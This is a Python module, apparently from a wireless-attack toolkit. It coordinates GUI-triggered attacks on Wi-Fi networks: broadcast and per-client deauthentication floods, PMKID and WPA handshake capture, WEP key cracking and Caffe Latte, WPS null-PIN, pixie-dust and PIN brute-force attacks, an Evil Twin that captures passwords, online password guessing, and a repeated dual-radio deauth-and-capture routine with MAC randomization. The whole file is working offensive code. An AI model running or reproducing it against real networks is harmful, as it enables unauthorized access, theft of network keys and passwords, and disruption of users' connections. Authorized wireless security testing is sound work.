"""Attack orchestration logic extracted from gui/app.py.

AttackRunner holds the runtime state needed to run any GUI-triggered
attack (monitor interface, own MAC, capture/wordlist paths, stop event,
log/progress callbacks) and provides one method per attack. It does not
import tkinter or handle confirmation dialogs — App still owns UI/state
management and calls these methods inside _run_bg() background threads.
"""

from __future__ import annotations

import threading
import time
from collections.abc import Callable


class AttackRunner:
    """Thin orchestration layer between the Tkinter App and the attack
    implementations in attacks/, crack/, omni/, wep/, and wps/."""

    def __init__(
        self,
        mon_iface: str | None,
        own_mac: str | None,
        capture_dir: str,
        wordlist: str | None,
        stop_event: threading.Event,
        progress_fn: Callable[[str], None],
        log_fn: Callable[[str], None],
        watch_capture_fn: Callable[[str, threading.Event], None] | None = None,
        crack_proc_holder: dict | None = None,
    ):
        self.mon_iface = mon_iface
        self.own_mac = own_mac
        self.capture_dir = capture_dir
        self.wordlist = wordlist
        self._stop_event = stop_event
        self._progress_fn = progress_fn
        self._log = log_fn
        self._watch_capture_fn = watch_capture_fn
        # Shared with App._crack_proc_holder so _stop_attack() can terminate
        # a crack subprocess started by OMNI/Smart's own crack stage, not
        # just the separate Captures-tab "Crack Selected" one.
        self._crack_proc_holder = crack_proc_holder if crack_proc_holder is not None else {}

    @property
    def _iface(self) -> str:
        if self.mon_iface is None:
            raise RuntimeError("monitor interface required")
        return self.mon_iface

    @property
    def _mac(self) -> str:
        if self.own_mac is None:
            raise RuntimeError("own MAC required")
        return self.own_mac

    # ------------------------------------------------------------------
    # Deauthentication
    # ------------------------------------------------------------------

    def deauth_all(self, ap) -> str:
        from ..attacks.deauth import deauth
        from ..frames import BROADCAST

        sent = deauth(
            self._iface, ap.bssid, client=BROADCAST, count=64, channel=ap.channel,
            progress_fn=self._progress_fn,
        )
        return f"sent {sent} deauth frames to broadcast"

    def deauth_client(self, ap, client: str) -> str:
        from ..attacks.deauth import deauth

        sent = deauth(
            self._iface, ap.bssid, client=client, count=64, channel=ap.channel,
            progress_fn=self._progress_fn,
        )
        return f"sent {sent} deauth frames to {client}"

    # ------------------------------------------------------------------
    # Native WPA/WEP captures
    # ------------------------------------------------------------------

    def pmkid(self, ap) -> str:
        from ..attacks.pmkid import capture_pmkid
        from ..storage import target_capture_dir

        line = capture_pmkid(
            self._iface, ap.bssid, self._mac, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if line is None:
            return "no PMKID captured"
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"pmkid_{int(time.time())}.22000"
        out_file.write_text(line + "\n")
        return f"saved to {out_file}"

    def handshake(self, ap) -> str:
        from ..attacks.handshake import capture_handshake
        from ..storage import target_capture_dir

        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"handshake_{int(time.time())}.pcap"
        watch_stop = threading.Event()
        if self._watch_capture_fn is not None:
            threading.Thread(
                target=self._watch_capture_fn, args=(str(out_file), watch_stop), daemon=True
            ).start()
        try:
            cap = capture_handshake(
                self._iface, ap.bssid, channel=ap.channel, timeout=60.0,
                outfile=str(out_file), stop_event=self._stop_event, progress_fn=self._progress_fn,
            )
        finally:
            watch_stop.set()
        if not cap.messages:
            return "no EAPOL traffic seen"
        statuses = [cap.status(a, c).value for a, c in cap.messages]
        return f"{len(cap.messages)} pair(s), statuses={statuses}, saved to {out_file}"

    def smart(self, ap) -> str:
        return self._omni_style(ap, "run_smart")

    def omni(self, ap) -> str:
        return self._omni_style(ap, "run")

    def _omni_style(self, ap, method: str) -> str:
        from ..crack.john import JohnCracker, JohnUnavailableError
        from ..omni import OmniOrchestrator

        cracker = None
        if self.wordlist:
            try:
                cracker = JohnCracker()
            except JohnUnavailableError as exc:
                self._log(f"warning: {exc} — will batch hashes but not crack")
        orch = OmniOrchestrator(
            self._iface, cracker=cracker, capture_dir=self.capture_dir,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
            proc_holder=self._crack_proc_holder,
        )
        report = getattr(orch, method)(ap, wordlist=self.wordlist)
        self._log(report.summary())
        return "cracked" if report.cracked else "no crack"

    # ------------------------------------------------------------------
    # WEP
    # ------------------------------------------------------------------

    def wep(self, ap, key_len: int) -> str:
        from ..attacks.wep_crack import crack_wep

        key = crack_wep(
            self._iface, ap.bssid, self._mac, ap.ssid, key_len=key_len,
            channel=ap.channel, progress_fn=self._progress_fn,
        )
        return key.hex() if key else "no key recovered"

    def caffe_latte(self, client_mac: str, ap, key_len: int) -> str:
        from ..attacks.wep_client import caffe_latte

        key = caffe_latte(
            self._iface, client_mac, key_len=key_len, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        return key.hex() if key else "no key recovered"

    # ------------------------------------------------------------------
    # WPS
    # ------------------------------------------------------------------

    def wps_null_pin(self, ap) -> str:
        from ..attacks.wps import null_pin_attack

        outcome = null_pin_attack(
            self._iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
            stop_event=self._stop_event,
        )
        if outcome.network_key:
            return f"{outcome.outcome.value}: key={outcome.network_key}"
        return outcome.outcome.value

    def wps_pixie(self, ap) -> str:
        from ..attacks.wps import pixie_attempt

        result = pixie_attempt(
            self._iface, ap.bssid, ap.ssid, channel=ap.channel, progress_fn=self._progress_fn,
            stop_event=self._stop_event,
        )
        if result.outcome.name == "SUCCESS":
            return f"pixie-dust success: key={result.network_key}"
        suffix = f" — {result.detail}" if result.detail else ""
        return f"pixie-dust failed: {result.outcome.name}{suffix}"

    def wps_bruteforce(self, ap) -> str:
        from ..attacks.wps import wps_pin_bruteforce

        result = wps_pin_bruteforce(
            self._iface, ap.bssid, ap.ssid, channel=ap.channel,
            stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if result.success:
            return f"PIN={result.pin} key={result.network_key}"
        if result.ap_setup_locked:
            return "AP setup locked"
        if result.aborted_lockout:
            return f"aborted after repeated timeouts ({result.attempts} attempts)"
        return f"no result ({result.attempts} attempts)"

    # ------------------------------------------------------------------
    # Evil Twin / Online Guess
    # ------------------------------------------------------------------

    def eviltwin(self, ap, iface_ap: str) -> str:
        from ..attacks.eviltwin import run_eviltwin

        result = run_eviltwin(
            iface_ap=iface_ap,
            iface_mon=self._iface,
            bssid=ap.bssid,
            ssid=ap.ssid,
            channel=ap.channel or 6,
            stop_event=self._stop_event,
            progress_fn=self._progress_fn,
        )
        if result.success:
            return f"Evil Twin: password captured → {result.password!r}"
        return f"Evil Twin: {result.detail}"

    def online_guess(self, ap) -> str:
        from ..attacks.online import online_guess

        if self.wordlist is None:
            return "no wordlist configured"
        result = online_guess(
            self._iface, ap.bssid, ap.ssid, self._mac, self.wordlist,
            channel=ap.channel, stop_event=self._stop_event, progress_fn=self._progress_fn,
        )
        if result.success:
            return f"password={result.password!r} after {result.attempts} attempt(s)"
        return f"{result.detail} ({result.attempts} attempt(s), {result.skipped_invalid} skipped)"

    # ------------------------------------------------------------------
    # PINCER (dual-Alfa)
    # ------------------------------------------------------------------

    def pincer(self, ap, scan_iface: str, attack_iface: str, randomize_mac: bool,
               watch_capture_fn: Callable[[str, threading.Event], None]) -> str:
        from ..attacks.deauth import deauth
        from ..attacks.handshake import HandshakeStatus, capture_handshake
        from ..radio import ensure_channel, get_mode, set_managed_mode, set_monitor_mode
        from ..storage import target_capture_dir

        max_rounds = 12
        interval = 10
        out_dir = target_capture_dir(ap.ssid, ap.bssid)
        out_file = out_dir / f"pincer_{int(time.time())}.pcap"

        self._log(f"PINCER: putting {scan_iface} (scan/listen) into monitor mode (randomize_mac={randomize_mac})")
        scan_mon, scan_perm_mac = set_monitor_mode(scan_iface, randomize_mac=randomize_mac)
        self._log(f"PINCER: {scan_mon} mode={get_mode(scan_mon)}")
        self._log(f"PINCER: putting {attack_iface} (attack/deauth) into monitor mode (randomize_mac={randomize_mac})")
        attack_mon, attack_perm_mac = set_monitor_mode(attack_iface, randomize_mac=randomize_mac)
        self._log(f"PINCER: {attack_mon} mode={get_mode(attack_mon)}")
        try:
            if ap.channel:
                ensure_channel(scan_mon, ap.channel)
                ensure_channel(attack_mon, ap.channel)
                self._log(f"PINCER: both radios parked on channel {ap.channel}")
            else:
                self._log("PINCER: no channel known for target — radios left on their current channel")

            result: dict = {}

            def listen():
                result["cap"] = capture_handshake(
                    scan_mon, ap.bssid, channel=ap.channel,
                    timeout=interval * max_rounds + 15, outfile=str(out_file),
                    stop_event=self._stop_event, progress_fn=self._log,
                )

            self._log(f"PINCER: {scan_mon} starting EAPOL listener, writing to {out_file}")
            listener = threading.Thread(target=listen, daemon=True)
            listener.start()
            watch_stop = threading.Event()
            threading.Thread(target=watch_capture_fn, args=(str(out_file), watch_stop), daemon=True).start()

            def authorized() -> bool:
                cap = result.get("cap")
                return bool(cap and any(cap.status(a, c) is HandshakeStatus.AUTHORIZED for a, c in cap.messages))

            for round_n in range(max_rounds):
                if self._stop_event.is_set():
                    self._log(f"PINCER: stop requested before round {round_n + 1}/{max_rounds}")
                    break
                sent = deauth(attack_mon, ap.bssid, channel=ap.channel, progress_fn=self._log)
                if sent == 0:
                    self._log(
                        f"PINCER round {round_n + 1}/{max_rounds}: deauth did NOT go out "
                        f"({attack_mon} -> {ap.bssid}) — see the warning above"
                    )
                else:
                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: sent {sent} deauth frame(s) ({attack_mon} -> {ap.bssid})")
                cap = result.get("cap")
                if cap is not None:
                    statuses = {(a, c): cap.status(a, c).value for a, c in cap.messages}
                    self._log(f"PINCER round {round_n + 1}/{max_rounds}: EAPOL pairs seen so far: {statuses!r}")
                for _ in range(interval):
                    if self._stop_event.is_set() or authorized():
                        break
                    time.sleep(1)
                if authorized():
                    self._log("PINCER: AUTHORIZED handshake detected — stopping deauth rounds")
                    break

            listener.join(timeout=5)
            watch_stop.set()
        finally:
            self._log("PINCER: restoring both radios to managed mode")
            set_managed_mode(scan_mon, restore_mac=scan_perm_mac)
            set_managed_mode(attack_mon, restore_mac=attack_perm_mac)
            self._log("PINCER: both radios restored")

        if authorized():
            return f"AUTHORIZED handshake captured -> {out_file}"
        return "stopped or exhausted rounds, no AUTHORIZED handshake"
